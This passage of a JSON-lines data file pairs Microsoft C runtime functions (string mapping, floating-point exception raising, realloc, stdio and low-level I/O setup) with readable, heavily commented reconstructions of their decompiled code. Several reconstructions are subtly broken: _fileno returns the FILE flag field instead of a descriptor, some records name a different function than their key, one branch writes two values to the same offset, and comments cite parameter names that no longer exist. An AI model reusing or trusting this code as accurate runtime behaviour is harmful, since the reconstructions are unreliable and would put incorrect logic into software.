pointer\n            pWVar7[0] = L''; // Initialize first character\n            pWVar7[1] = L'\\0'; // Null-terminate the string\n        } else {\n            pWVar7 = (LPCWSTR)_malloc_base(uVar9); // Allocate memory on the heap\n            if (pWVar7 == (LPCWSTR)0x0) goto LAB_1400170df; // Check for null pointer\n            pWVar7[0] = L'\\xdddd'; // Initialize first character\n            pWVar7[1] = L'\\0'; // Null-terminate the string\n        }\n    }\n\nLAB_1400170df:\n    // If memory allocation was successful\n    if (pWVar7 != (LPCWSTR)0x0) {\n        pwVar2 = local_38; // Store the local wide character pointer\n        // Call the LCMapStringEx function to map the string\n        iVar4 = __acrt_LCMapStringEx(pwVar2, param_3, pWVar7, iVar3, (LPWSTR)pWVar7, iVar3, 0, 0, 0);\n        // Check if the mapping was successful\n        if (iVar4 != 0) {\n            if (param_7 == 0) {\n                return 0; // Return 0 if param_7 is 0\n            } else {\n                *(int *)(pWVar7 + -8) = param_7; // Store param_7 in allocated memory\n                *(char **)(pWVar7 + -8) = param_6; // Store param_6 in allocated memory\n            }\n        }\n    }\n\nLAB_1400172a1:\n    // Perform stack protection check\n    uVar9 = local_30 ^ (ulonglong)&local_38;\n    __security_check_cookie(uVar9);\n    return 0; // Return 0 at the end of the function\n}\n"}
{"Function Name": "__acrt_LCMapStringA", "Address": "1400172ec", "Source Code": "\nvoid __acrt_LCMapStringA(__crt_locale_pointers *localePointers, wchar_t *wideCharString, ulong stringLength, char *charBuffer, int bufferSize, char *outputBuffer, int outputSize, int flags, int additionalFlags)\n{\n    longlong localeData; // Local variable to store locale-related data\n    __crt_locale_pointers localePointerArray[16]; // Array to hold locale pointers\n\n    // Initialize locale update with the provided locale pointers\n    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&localeData, localePointers);\n\n    // Call the function to map strings based on the locale settings\n    __acrt_LCMapStringA_stat(localePointerArray, wideCharString, stringLength, charBuffer, bufferSize, outputBuffer, outputSize, flags, additionalFlags);\n\n    // Check if a specific flag in the locale data is set\n    if (*(uint *)(localeData + 0x3a8) & 0x2) {\n        // Clear the specific flag in the locale data\n        *(uint *)(localeData + 0x3a8) &= 0xfffffffd;\n    }\n    \n    return; // Exit the function\n}\n"}
{"Function Name": "_raise_exc", "Address": "140017384", "Source Code": "\nvoid _raise_exc(uint *exception_code, ulonglong *exception_data, ulonglong exception_id, uint error_code, uint *context, uint *handler)\n{\n    // Call the extended exception raising function with the provided parameters\n    _raise_exc_ex(exception_code, exception_data, exception_id, error_code, context, handler, 0);\n}\n"}
{"Function Name": "_raise_exc_ex", "Address": "1400173ac", "Source Code": "\nvoid _raise_exc_ex(uint *outputArray, ulonglong *inputValue, ulonglong flags, uint inputParam, uint *sourcePointer1, uint *sourcePointer2, int condition)\n{\n    DWORD exceptionCode = 0xc000000d; // Initialize exception code to a default value\n    outputArray[1] = 0; // Clear the second element of param_1\n    outputArray[2] = 0; // Clear the third element of param_1\n    outputArray[3] = 0; // Clear the fourth element of param_1\n\n    // Check bits in param_3 to set specific exception codes and flags\n    if ((flags & 0x10) != 0) {\n        exceptionCode = 0xc000008f; // Set exception code for specific condition\n        outputArray[1] |= 1; // Set the corresponding flag in param_1[1]\n    }\n    if ((flags & 2) != 0) {\n        exceptionCode = 0xc0000093; // Set exception code for specific condition\n        outputArray[1] |= 2; // Set the corresponding flag in param_1[1]\n    }\n    if ((flags & 1) != 0) {\n        exceptionCode = 0xc0000091; // Set exception code for specific condition\n        outputArray[1] |= 4; // Set the corresponding flag in param_1[1]\n    }\n    if ((flags & 4) != 0) {\n        exceptionCode = 0xc000008e; // Set exception code for specific condition\n        outputArray[1] |= 8; // Set the corresponding flag in param_1[1]\n    }\n    if ((flags & 8) != 0) {\n        exceptionCode = 0xc0000090; // Set exception code for specific condition\n        outputArray[1] |= 0x10; // Set the corresponding flag in param_1[1]\n    }\n\n    // Update param_1[2] based on the bits of *param_2\n    outputArray[2] ^= (~((int)(*inputValue >> 7) << 4) ^ outputArray[2]) & 0x10; // Update based on bit 7\n    outputArray[2] ^= (~((int)(*inputValue >> 9) << 3) ^ outputArray[2]) & 8; // Update based on bit 9\n    outputArray[2] ^= (~((int)(*inputValue >> 10) << 2) ^ outputArray[2]) & 4; // Update based on bit 10\n    outputArray[2] ^= (~((int)(*inputValue >> 0xb) * 2) ^ outputArray[2]) & 2; // Update based on bit 11\n    outputArray[2] ^= (~((uint)*inputValue >> 0xc) ^ outputArray[2]) & 1; // Update based on bit 12\n\n    uint statusFlags = _statfp(); // Call _statfp() and store the result in uVar1\n    // Update param_1[3] based on the flags returned by _statfp()\n    outputArray[3] |= (statusFlags & 1) ? 0x10 : 0; // Check flag 0\n    outputArray[3] |= (statusFlags & 4) ? 8 : 0; // Check flag 2\n    outputArray[3] |= (statusFlags & 8) ? 4 : 0; // Check flag 3\n    outputArray[3] |= (statusFlags & 0x10) ? 2 : 0; // Check flag 4\n    outputArray[3] |= (statusFlags & 0x20) ? 1 : 0; // Check flag 5\n\n    statusFlags = (uint)*inputValue & 0x6000; // Mask *param_2 to extract specific bits\n    // Update *param_1 based on the value of uVar1\n    if (statusFlags == 0) {\n        *outputArray &= 0xfffffffc; // Clear specific bits\n    } else if (statusFlags == 0x2000) {\n        *outputArray = (*outputArray & 0xfffffffd) | 1; // Set specific bit\n    } else if (statusFlags == 0x4000) {\n        *outputArray = (*outputArray & 0xfffffffe) | 2; // Set specific bit\n    } else if (statusFlags == 0x6000) {\n        *outputArray |= 3; // Set specific bits\n    }\n\n    *outputArray &= 0xfffe001f; // Clear specific bits in *param_1\n    *outputArray |= (inputParam & 0xfff) << 5; // Set bits in *param_1 based on param_4\n    outputArray[8] |= 1; // Set a flag in param_1[8]\n\n    // Conditional logic based on param_7\n    if (condition == 0) {\n        outputArray[8] = (outputArray[8] & 0xffffffe3) | 2; // Update param_1[8] for case 0\n        *(undefined8 *)(outputArray + 4) = *(undefined8 *)sourcePointer1; // Copy value from param_5\n        outputArray[0x18] = (outputArray[0x18] & 0xffffffe3) | 2; // Update param_1[0x18]\n        *(undefined8 *)(outputArray + 0x14) = *(undefined8 *)sourcePointer2; // Copy value from param_6\n    } else {\n        outputArray[8] &= 0xffffffe1; // Clear specific bits in param_1[8]\n        outputArray[4] = *sourcePointer1; // Copy value from param_5\n        outputArray[0x18] |= 1; // Set a flag in param_1[0x18]\n        outputArray[0x18] &= 0xffffffe1; // Clear specific bits in param_1[0x18]\n        outputArray[0x14] = *sourcePointer2; // Copy value from param_6\n    }\n\n    _clrfp(); // Clear the floating-point environment\n    RaiseException(exceptionCode, 0, 1, (ULONG_PTR *)&outputArray); // Raise the exception with the specified code\n\n    statusFlags = outputArray[2]; // Get the value of param_1[2]\n    // Update *param_2 based on the flags in uVar1\n    if (statusFlags & 0x10) *inputValue &= 0xffffffffffffff7f; // Clear bit 7\n    if (statusFlags & 8) *inputValue &= 0xfffffffffffffdff; // Clear bit 9\n    if (statusFlags & 4) *inputValue &= 0xfffffffffffffbff; // Clear bit 10\n    if (statusFlags & 2) *inputValue &= 0xfffffffffffff7ff; // Clear bit 11\n    if (statusFlags & 1) *inputValue &= 0xffffffffffffefff; // Clear bit 12\n\n    statusFlags = *outputArray & 3; // Mask *param_1 to extract specific bits\n    // Update *param_2 based on the value of uVar1\n    if (statusFlags == 0) {\n        *inputValue &= 0xffffffffffff9fff; // Clear specific bits\n    } else if (statusFlags == 1) {\n        *inputValue = (*inputValue & 0xffffffffffffbfff) | 0x2000; // Set specific bit\n    } else if (statusFlags == 2) {\n        *inputValue = (*inputValue & 0xffffffffffffdfff) | 0x4000; // Set specific bit\n    } else if (statusFlags == 3) {\n        *inputValue |= 0x6000; // Set specific bits\n    }\n\n    // Conditional logic based on param_7 for copying back to param_6\n    if (condition == 0) {\n        *(undefined8 *)sourcePointer2 = *(undefined8 *)(outputArray + 0x14); // Copy value back for case 0\n    } else {\n        *sourcePointer2 = outputArray[0x14]; // Copy value back for case 1\n    }\n}\n"}
{"Function Name": "_raise_excf", "Address": "1400176bc", "Source Code": "\nvoid _raise_excf(uint *error_code, ulonglong *error_details, ulonglong error_id, uint error_level, uint *context_data, uint *additional_info)\n{\n    // Call the function _raise_exc_ex with the provided parameters and an additional argument set to 1\n    _raise_exc_ex(error_code, error_details, error_id, error_level, context_data, additional_info, 1);\n}\n"}
{"Function Name": "_set_errno_from_matherr", "Address": "1400176e8", "Source Code": "\nvoid _set_errno_from_matherr(int error_code)\n{\n    ulong *error_pointer = __doserrno(); // Get a pointer to the DOS error number\n    if (error_code == 1) { // Check if the parameter is equal to 1\n        *error_pointer = 0x21; // Set the error number to 0x21 for this case\n    } else if (error_code - 2U < 2) { // Check if the parameter is 2 or 3\n        *error_pointer = 0x22; // Set the error number to 0x22 for this case\n    }\n}\n"}
{"Function Name": "_clrfp", "Address": "140017718", "Source Code": "\nuint clear_fpsr(void) // Function to clear the floating-point status register\n{\n    clear_fcontrol(); // Call to clear the floating-point control register\n    return get_fpsr() & 0x3f; // Return the lower 6 bits of the floating-point status register\n}\n"}
{"Function Name": "_ctrlfp", "Address": "140017738", "Source Code": "\nuint _ctrlfp(uint control_settings, uint input_mask)\n{\n    // Retrieve the current floating-point status register value\n    uint initial_fpsr = _get_fpsr();\n    \n    // Calculate the new floating-point control settings based on input parameters\n    uint new_fpsr_settings = (~input_mask | 0xffff807f) & initial_fpsr | control_settings & input_mask;\n\n    // Update the floating-point control settings conditionally based on a global variable\n    FUN_14001ce70((DAT_14003831c == '\\0' || (new_fpsr_settings & 0x40) == 0) ? (new_fpsr_settings & 0xffffffbf) : new_fpsr_settings);\n    \n    // Return the original floating-point status register value\n    return initial_fpsr;\n}\n"}
{"Function Name": "_set_statfp", "Address": "1400177b4", "Source Code": "\nvoid _set_statfp(uint status_param)\n{\n    // Call the function FUN_14001ce70 with the result of the bitwise OR operation\n    // between the current floating-point status register (_get_fpsr()) and \n    // the lower 6 bits of param_1 (param_1 & 0x3f).\n    FUN_14001ce70(_get_fpsr() | (status_param & 0x3f));\n}\n"}
{"Function Name": "_statfp", "Address": "1400177d4", "Source Code": "\nuint getFloatingPointStatus(void) // Function declaration for _statfp, returning an unsigned integer\n{\n    return retrieveFloatingPointStatusRegister() & 0x3f; // Retrieve the floating-point status register and mask it with 0x3f\n}\n"}
{"Function Name": "_realloc_base", "Address": "1400177e8", "Source Code": "\nLPVOID _realloc_base(LPVOID original_pointer, ulonglong new_size)\n{\n    LPVOID new_pointer = (LPVOID)0x0; // Initialize pointer to null\n    if (original_pointer == (LPVOID)0x0) { // Check if the original pointer is null\n        new_pointer = _malloc_base(new_size); // Allocate new memory if original pointer is null\n    } else if (new_size == 0) { // Check if the new size is zero\n        _free_base(original_pointer); // Free the original memory if new size is zero\n    } else if (new_size < 0xffffffffffffffe1) { // Check if new size is within valid range\n        do {\n            new_pointer = HeapReAlloc(heap_handle, 0, original_pointer, new_size); // Attempt to reallocate memory\n            if (new_pointer != (LPVOID)0x0) { // Check if reallocation was successful\n                return new_pointer; // Return the new pointer if successful\n            }\n        } while (FUN_14001488c() != 0 && _callnewh(new_size) != 0); // Retry if allocation failed and conditions are met\n    }\n    *error_code() = 0xc; // Set error code for allocation failure\n    return new_pointer; // Return null pointer if all attempts failed\n}\n"}
{"Function Name": "iswctype", "Address": "140017864", "Source Code": "\nint __cdecl iswctype(wint_t inputCharacter, wctype_t characterType)\n{\n    uint result;              // Variable to store the result\n    BOOL isStringTypeRetrieved;              // Variable to store the result of GetStringTypeW\n    WORD characterTypeInfo;         // Variable to hold character type information\n    WCHAR wideCharacter;       // Variable to hold the wide character\n\n    if (inputCharacter == 0xffff) {      // Check if the input character is the special value 0xffff\n        result = 0;           // Set result to 0 if the character is 0xffff\n    } else {\n        if (inputCharacter < 0x100) {    // Check if the character is a single-byte character\n            characterTypeInfo = *(WORD *)(PTR_DAT_1400380c8 + (ulonglong)inputCharacter * 2); // Retrieve character type from a predefined table\n        } else {\n            wideCharacter = inputCharacter; // Assign the wide character to local variable\n            isStringTypeRetrieved = GetStringTypeW(1, &wideCharacter, 1, &characterTypeInfo); // Call API to get character type information\n            if (isStringTypeRetrieved == 0) {  // Check if the API call was unsuccessful\n                result = 0;     // Set result to 0 if the API call failed\n                goto end;      // Jump to end to return the result\n            }\n        }\n        result = (uint)(characterTypeInfo & characterType); // Perform bitwise AND to check if the character type matches the specified type\n    }\nend:\n    return result;            // Return the result\n}\n"}
{"Function Name": "_mbtowc_l", "Address": "1400178d4", "Source Code": "\nint __cdecl _mbtowc_l(wchar_t *destinationChar, char *sourceChar, size_t sourceSizeInBytes, _locale_t locale)\n{\n    uint returnValue; // Variable to store the return value\n    longlong localeUpdate; // Local variable for locale update\n    localeinfo_struct localeInfo; // Structure to hold locale information\n\n    // Check if source character pointer is null or source size is zero\n    if ((sourceChar == (char *)0x0) || (sourceSizeInBytes == 0)) {\n        errorState = 0; // Reset error state\n        return 0; // Return 0 for invalid input\n    }\n    \n    // Check if the first character of source is null\n    if (*sourceChar == '\\0') {\n        // If destination character pointer is not null, set it to null wide character\n        if (destinationChar != (wchar_t *)0x0) {\n            *destinationChar = L'\\0';\n        }\n        return 0; // Return 0 for null source character\n    }\n    \n    // Update locale information\n    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&localeUpdate, (__crt_locale_pointers *)locale);\n    \n    // Check if the locale code page is UTF-8\n    if ((localeInfo.locinfo)->lc_time_cp == 0xfde9) {\n        __uint64 conversionResult = __crt_mbstring::__mbrtowc_utf8(destinationChar, sourceChar, sourceSizeInBytes, (_Mbstatet *)&errorState);\n        returnValue = (uint)conversionResult; // Store the result of conversion\n        if ((int)returnValue < 0) {\n            returnValue = 0xffffffff; // Set error value if conversion failed\n        }\n        goto LAB_14001796f; // Jump to return value handling\n    }\n    \n    // Check if the locale name is not set\n    if ((localeInfo.locinfo)->locale_name[2] == (wchar_t *)0x0) {\n        // If destination character pointer is not null, convert single byte to wide character\n        if (destinationChar != (wchar_t *)0x0) {\n            *destinationChar = (ushort)(byte)*sourceChar;\n        }\n        returnValue = 1; // Set return value for successful conversion\n        goto LAB_14001796f; // Jump to return value handling\n    }\n    \n    // Check if the source character is a lead byte\n    int leadByteCheck = _isleadbyte_l((uint)(byte)*sourceChar, &localeInfo);\n    if (leadByteCheck == 0) {\n        // Convert single byte to wide character using the locale code page\n        leadByteCheck = __acrt_MultiByteToWideChar((localeInfo.locinfo)->lc_time_cp, 9, sourceChar, 1, destinationChar, (uint)(destinationChar != (wchar_t *)0x0));\n        if (leadByteCheck != 0) {\n            returnValue = 1; // Set return value for successful conversion\n            goto LAB_14001796f; // Jump to return value handling\n        }\n    } else {\n        returnValue = (localeInfo.locinfo)->lc_collate_cp; // Get the collate code page\n        // Check if the collate code page is valid and within source size\n        if ((((1 < (int)returnValue) && ((int)returnValue <= (int)sourceSizeInBytes)) &&\n            (leadByteCheck = __acrt_MultiByteToWideChar((localeInfo.locinfo)->lc_time_cp, 9, sourceChar, returnValue, destinationChar, (uint)(destinationChar != (wchar_t *)0x0)), leadByteCheck != 0)) ||\n            (((ulonglong)(longlong)(int)(localeInfo.locinfo)->lc_collate_cp <= sourceSizeInBytes && (sourceChar[1] != '\\0')))) {\n            goto LAB_14001796f; // Jump to return value handling\n        }\n    }\n    \n    ulong *dosErrorPointer = __doserrno(); // Get the pointer to the DOS error number\n    returnValue = 0xffffffff; // Set error value for conversion failure\n    *dosErrorPointer = 0x2a; // Set the error code\n\nLAB_14001796f:\n    return returnValue; // Return the result of the conversion\n}\n"}
{"Function Name": "FUN_140017a50", "Address": "140017a50", "Source Code": "\nvoid FUN_140017a50(wchar_t *wide_char_string, char *multi_byte_string, size_t max_bytes)\n{\n    // Convert a multibyte character string (param_2) to a wide character string (param_1)\n    // using the specified maximum number of bytes (param_3) and the default locale.\n    _mbtowc_l(wide_char_string, multi_byte_string, max_bytes, (locale_t)0);\n}\n"}
{"Function Name": "_fileno", "Address": "140017a58", "Source Code": "\nint __cdecl _fileno(FILE *filePointer)\n{\n    // Check if the provided FILE pointer is null\n    if (filePointer == (FILE *)0x0) {\n        // Set the DOS error number to indicate an invalid file handle\n        *getDosError() = 0x16;\n        // Call a function to handle the error (implementation not shown)\n        handleError();\n        // Return -1 to indicate an error\n        return -1;\n    }\n    // Return the file status flags from the FILE structure\n    return filePointer->_flag;\n}\n"}
{"Function Name": "__acrt_initialize_stdio", "Address": "140017a80", "Source Code": "\nundefined8 __acrt_initialize_stdio(void)\n{\n    longlong memoryIndex = 0; // Initialize variable for indexing allocated memory\n    longlong loopCounter = 3; // Set loop counter for initialization\n\n    // Check if DAT_14003a458 is uninitialized\n    if (initializationValue == 0) {\n        initializationValue = 0x200; // Set default value if uninitialized\n    } else if (initializationValue < 3) {\n        initializationValue = 3; // Ensure minimum value is 3\n    }\n\n    // Allocate memory for DAT_14003a460 based on DAT_14003a458\n    allocatedMemory = _calloc_base((longlong)initializationValue, 8);\n    _free_base((LPVOID)0x0); // Free unused memory\n\n    // Check if memory allocation was successful\n    if (allocatedMemory == (LPVOID)0x0) {\n        initializationValue = 3; // Reset to minimum value if allocation failed\n        allocatedMemory = _calloc_base(3, 8); // Attempt to allocate minimum memory\n        _free_base((LPVOID)0x0); // Free unused memory again\n        // Check if the second allocation was successful\n        if (allocatedMemory == (LPVOID)0x0) {\n            return 0xffffffff; // Return error code if allocation failed\n        }\n    }\n\n    undefined4 *dataStructurePointer = &DAT_140038338; // Pointer to some data structure\n    undefined *dataStructurePointer2 = &DAT_140038320; // Pointer to another data structure\n    longlong loopIndex = 0; // Initialize index for loop\n\n    // Loop to initialize critical sections and set up data structures\n    do {\n        __acrt_InitializeCriticalSectionEx((LPCRITICAL_SECTION)(dataStructurePointer2 + 0x30), 4000, 0); // Initialize critical section\n        *(undefined **)(memoryIndex + (longlong)allocatedMemory) = dataStructurePointer2; // Store pointer in allocated memory\n        \n        // Check a condition and set a value in puVar3 if condition is met\n        if (*(longlong *)((&DAT_14003a480)[loopIndex >> 6] + 0x28 + (ulonglong)((uint)loopIndex & 0x3f) * 0x48) + 2U < 3) {\n            *dataStructurePointer = 0xfffffffe; // Set error code if condition is met\n        }\n        \n        loopIndex++; // Increment loop index\n        dataStructurePointer2 += 0x58; // Move to the next data structure\n        memoryIndex += 8; // Increment memory index\n        dataStructurePointer += 0x16; // Move to the next element in puVar3\n        loopCounter--; // Decrement loop counter\n    } while (loopCounter != 0); // Continue loop until counter reaches zero\n    \n    return 0; // Return success code\n}\n"}
{"Function Name": "__acrt_uninitialize_stdio", "Address": "140017ba0", "Source Code": "\nvoid __acrt_uninitialize_stdio(bool flush_all_streams)\n{\n    // Flush all open streams with the given parameter\n    common_flush_all(flush_all_streams);\n    \n    // Close all open file streams\n    _fcloseall();\n    \n    // Loop through a range of buffers (0 to 24, incrementing by 8)\n    for (longlong buffer_index = 0; buffer_index < 0x18; buffer_index += 8) {\n        // Free the buffer associated with the current index\n        __acrt_stdio_free_buffer_nolock(*(undefined8 **)(buffer_index + (longlong)base_memory_pointer));\n        \n        // Delete the critical section associated with the current buffer\n        DeleteCriticalSection((LPCRITICAL_SECTION)(*(longlong *)(buffer_index + (longlong)base_memory_pointer) + 0x30));\n    }\n    \n    // Free the base memory allocated for the standard I/O\n    _free_base(base_memory_pointer);\n    \n    // Set the pointer to the base memory to NULL\n    base_memory_pointer = (LPVOID)0x0;\n}\n"}
{"Function Name": "FUN_140017bfc", "Address": "140017bfc", "Source Code": "\nvoid FUN_140017bfc(longlong critical_section_ptr)\n{\n    // Enter a critical section to ensure thread safety\n    EnterCriticalSection((LPCRITICAL_SECTION)(critical_section_ptr + 0x30));\n}\n"}
{"Function Name": "FUN_140017c08", "Address": "140017c08", "Source Code": "\nvoid FUN_140017c08(longlong critical_section_ptr)\n{\n    // Leave the critical section associated with the specified parameter\n    LeaveCriticalSection((LPCRITICAL_SECTION)(critical_section_ptr + 0x30));\n}\n"}
{"Function Name": "initialize_inherited_file_handles_nolock", "Address": "140017c14", "Source Code": "\nvoid __cdecl initialize_inherited_file_handles_nolock(void)\n{\n    DWORD fileType; // Variable to store the file type\n    ulonglong unusedVar; // Unused variable\n    byte *reservedFileHandles; // Pointer to the reserved file handles\n    longlong fileHandleIndex; // Index for iterating through file handles\n    uint *flagsPointer; // Pointer to the flags associated with the file handles\n    uint numFileHandles; // Variable to store the number of file handles to process\n    ulonglong loopCounter; // Counter for the loop\n    _STARTUPINFOW startupInfo; // Structure to hold startup information\n\n    GetStartupInfoW(&startupInfo); // Retrieve startup information\n    fileHandleIndex = 0; // Initialize index to zero\n\n    // Check if there are reserved file handles\n    if ((startupInfo.cbReserved2 != 0) && ((uint *)startupInfo.lpReserved2 != (uint *)0x0)) {\n        flagsPointer = (uint *)((longlong)startupInfo.lpReserved2 + 4); // Pointer to the flags\n        reservedFileHandles = (byte *)((longlong)(int)*(uint *)startupInfo.lpReserved2 + (longlong)flagsPointer); // Pointer to the file handles\n        numFileHandles = 0x2000; // Default number of file handles to process\n\n        // Adjust uVar7 if the number of reserved handles is less than 0x2000\n        if ((int)*(uint *)startupInfo.lpReserved2 < 0x2000) {\n            numFileHandles = *(uint *)startupInfo.lpReserved2; // Set uVar7 to the actual number of handles\n        }\n\n        __acrt_lowio_ensure_fh_exists(numFileHandles); // Ensure the file handles exist\n\n        // Limit uVar7 to a maximum value defined by DAT_14003a880\n        if ((int)DAT_14003a880 < (int)numFileHandles) {\n            numFileHandles = DAT_14003a880; // Adjust uVar7 if necessary\n        }\n\n        loopCounter = (ulonglong)numFileHandles; // Set loop counter to the number of handles\n\n        // Process each reserved file handle\n        if (numFileHandles != 0) {\n            do {\n                // Check if the file handle is valid and if the flags indicate it should be processed\n                if ((((*(longlong *)reservedFileHandles != -1) && (*(longlong *)reservedFileHandles != -2)) && ((*flagsPointer & 1) != 0))\n                && (((*flagsPointer & 8) != 0 || (fileType = GetFileType(*(HANDLE *)reservedFileHandles), fileType != 0)))) {\n                    // Store the file handle and its associated flags in a global array\n                    *(undefined8 *)(&DAT_14003a480[fileHandleIndex >> 6] + 0x28 + ((uint)fileHandleIndex & 0x3f) * 0x48) = *(undefined8 *)reservedFileHandles;\n                    *(byte *)(&DAT_14003a480[fileHandleIndex >> 6] + 0x38 + ((uint)fileHandleIndex & 0x3f) * 0x48) = (byte)*flagsPointer;\n                }\n                fileHandleIndex++; // Increment the index\n                flagsPointer++; // Move to the next flags\n                reservedFileHandles += 8; // Move to the next file handle\n                loopCounter--; // Decrement the loop counter\n            } while (loopCounter != 0); // Continue until all handles are processed\n        }\n    }\n    return; // Exit the function\n}\n"}
{"Function Name": "initialize_stdio_handles_nolock", "Address": "140017d04", "Source Code": "\nvoid __cdecl initialize_stdio_handles_nolock(void)\n{\n    uint loopCounter = 0; // Initialize loop counter for standard handles\n    ulonglong handleIndex; // Variable to hold the index for accessing handle data\n    HANDLE stdHandle; // Handle for the standard input/output/error file\n    DWORD stdHandleId; // Variable to store the standard handle identifier\n\n    do {\n        handleIndex = (ulonglong)(loopCounter & 0x3f); // Calculate index for accessing handle data\n        longlong baseAddress = (&DAT_14003a480)[(longlong)(int)loopCounter >> 6]; // Get the base address for handle data\n\n        // Check if the handle is already initialized\n        if (*(longlong *)(baseAddress + 0x28 + handleIndex * 0x48) + 2U < 2) {\n            *(undefined1 *)(baseAddress + 0x38 + handleIndex * 0x48) = 0x81; // Mark the handle as initialized\n            // Determine the standard handle identifier based on uVar5\n            stdHandleId = (loopCounter == 0) ? 0xfffffff6 : (loopCounter == 1) ? 0xfffffff5 : 0xfffffff4;\n            stdHandle = GetStdHandle(stdHandleId); // Retrieve the standard handle\n\n            // Check if the handle is valid\n            if ((longlong)stdHandle + 1U < 2) {\n                *(byte *)(baseAddress + 0x38 + handleIndex * 0x48) |= 0x40; // Mark handle as invalid\n                *(undefined8 *)(baseAddress + 0x28 + handleIndex * 0x48) = 0xfffffffffffffffe; // Set handle value to invalid\n                // Update a global variable if it is set\n                if (DAT_14003a460 != 0) {\n                    *(undefined4 *)(*(longlong *)(DAT_14003a460) + 0x18) = 0xfffffffe; // Set error code\n                }\n            } else {\n                uint fileType = GetFileType(stdHandle); // Get the type of the file associated with the handle\n                *(HANDLE *)(baseAddress + 0x28 + handleIndex * 0x48) = stdHandle; // Store the valid handle\n\n                // Check the file type and set appropriate flags\n                if ((fileType & 0xff) == 2) {\n                    *(byte *)(baseAddress + 0x38 + handleIndex * 0x48) |= 0x40; // Mark as a character file\n                } else if ((fileType & 0xff) == 3) {\n                    *(byte *)(baseAddress + 0x38 + handleIndex * 0x48) |= 8; // Mark as a pipe\n                }\n            }\n        } else {\n            *(byte *)(baseAddress + 0x38 + handleIndex * 0x48) |= 0x80; // Mark handle as already initialized\n        }\n        loopCounter++; // Increment loop counter\n    } while (loopCounter != 3); // Loop until all standard handles are processed\n}\n"}
{"Function Name": "__acrt_initialize_lowio", "Address": "140017e10", "Source Code": "\nbool initializeLowIO(void)\n{\n    // Acquire a lock to ensure thread safety\n    acquireLock(7);\n    \n    // Check if the low-level I/O file handle exists\n    if (ensureFileHandleExists(0) == 0) {\n        // Initialize inherited file handles without holding the lock\n        initInheritedFileHandlesNoLock();\n        \n        // Initialize standard I/O handles without holding the lock\n        initStdIOHandlesNoLock();\n        \n        // Release the lock after initialization\n        releaseLock(7);\n        \n        // Return true indicating successful initialization\n        return true;\n    }\n    \n    // Release the lock if the file handle does not exist\n    releaseLock(7);\n    \n    // Return false indicating initialization failed\n    return false;\n}\n"}
{"Function Name": "__acrt_uninitialize_lowio", "Address": "140017e4c", "Source Code": "\nundefined1 __acrt_uninitialize_lowio(void)\n{\n    ulonglong offset = 0; // Initialize a variable to track the offset in the critical section array\n    do {\n        LPCRITICAL_SECTION criticalSection = *(LPCRITICAL_SECTION *)((longlong)&criticalSectionArray + offset); // Retrieve the critical section pointer at the current offset\n        if (criticalSection != (LPCRITICAL_SECTION)0x0) { // Check if the critical section pointer is not null\n            __acrt_lowio_destroy_handle_array(criticalSection); // Destroy the handle array associated with the critical section\n            *(undefined8 *)((longlong)&criticalSectionArray + offset) = 0; // Set the critical section pointer to null to indicate it has been destroyed\n        }\n        offset += 8; // Increment the offset by the size of a pointer (8 bytes)\n    } while (offset < 0x400); // Continue the loop until the offset reaches 1024 bytes (0x400)\n    return 1; // Return success\n}\n"}
{"Function Name": "__acrt_initialize_fma3", "Address": "140017e90", "Source Code": "\nundefined8 __acrt_initialize_fma3(void)\n{\n    longlong cpuFeatureFlags; // Declare a variable to hold the result of cpuid_Version_info\n    isFMA3Supported = 0; // Initialize DAT_14003a884 to 0\n    cpuFeatureFlags = cpuid_Version_info(1); // Call cpuid_Version_info with argument 1 and store the result in lVar1\n    // Check if specific bits in the CPU feature flags are set\n    if ((*(uint *)(cpuFeatureFlags + 0xc) & 0x18001000) == 0x18001000) {\n        // If the condition is met, update DAT_14003a884 based on the value of in_XCR0\n        isFMA3Supported = (uint)((in_XCR0 & 6) == 6);\n    }\n    fma3Status = isFMA3Supported; // Set DAT_14003a888 to the value of DAT_14003a884\n    return 0; // Return 0 to indicate successful completion\n}\n"}
{"Function Name": "FUN_140017f00", "Address": "140017f00", "Source Code": "\nulonglong FUN_140017f00(undefined8 input_param_1, undefined8 input_param_2, ulonglong input_param_3, uint input_param_4) {\n    int index_value = 0; // Initialize variable to store an index or type\n    ulonglong unused_var; // Declare a variable for future use (not initialized)\n    uint specific_value_1 = 0; // Initialize variable for a specific value based on conditions\n    uint specific_value_2 = 0; // Initialize variable for another specific value based on conditions\n\n    // Check if param_4 is equal to 2\n    if (input_param_4 == 2) {\n        index_value = 2; // Set iVar1 to 2\n        specific_value_2 = 0x22; // Set uVar4 to hexadecimal 22\n        specific_value_1 = 4; // Set uVar3 to 4\n    } \n    // Check if param_4 is less than 3\n    else if (input_param_4 < 3) {\n        return input_param_3; // Return param_3 if condition is met\n    } \n    // Check if param_4 is less than 6\n    else if (input_param_4 < 6) {\n        return FUN_14001d44c(input_param_3); // Call another function and return its result\n    } \n    // Check if param_4 is equal to 6\n    else if (input_param_4 == 6) {\n        index_value = 1; // Set iVar1 to 1\n        specific_value_2 = 0x21; // Set uVar4 to hexadecimal 21\n        specific_value_1 = 8; // Set uVar3 to 8\n    } \n    // Check if param_4 is less than 7\n    else if (input_param_4 < 7) {\n        return input_param_3; // Return param_3 if condition is met\n    } \n    // Check if param_4 is less than 9\n    else if (input_param_4 < 9) {\n        index_value = 4; // Set iVar1 to 4\n        specific_value_2 = 0x22; // Set uVar4 to hexadecimal 22\n        specific_value_1 = 0x12; // Set uVar3 to hexadecimal 12\n    } \n    // Check if param_4 is equal to 9\n    else if (input_param_4 == 9) {\n        index_value = 3; // Set iVar1 to 3\n        specific_value_2 = 0x22; // Set uVar4 to hexadecimal 22\n        specific_value_1 = 0x11; // Set uVar3 to hexadecimal 11\n    } \n    // If none of the above conditions are met\n    else {\n        return input_param_3; // Return param_3\n    }\n\n    // Call the function FUN_14001d1f0 with the specified parameters\n    FUN_14001d1f0(&DAT_14002a19c, 0x1d, input_param_3, index_value, specific_value_1, specific_value_2, input_param_1, input_param_2, 2);\n    return input_param_3; // Return param_3 at the end of the function\n}\n"}
